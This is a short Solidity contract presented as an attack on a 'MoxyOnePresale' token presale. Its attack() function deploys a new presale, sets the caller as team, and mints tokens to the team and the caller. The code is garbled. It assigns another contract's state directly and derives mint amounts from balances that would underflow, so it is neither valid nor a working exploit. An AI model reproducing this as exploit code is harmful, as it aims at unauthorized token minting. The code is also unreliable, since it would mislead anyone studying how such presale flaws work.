contract MoxyOnePresaleAttack {
    function attack() public {
        MoxyOnePresale presale = new MoxyOnePresale();
        presale.team = msg.sender;
        presale.preSaleStarted();
        uint256 balance = presale.token.balanceOf(presale.team);
        balance = balance - 100;
        presale.token.mint(presale.team, balance);
        uint256 attackerBalance = presale.token.balanceOf(msg.sender);
        attackerBalance = attackerBalance - 1000;
        presale.token.mint(msg.sender, attackerBalance);
    }
}
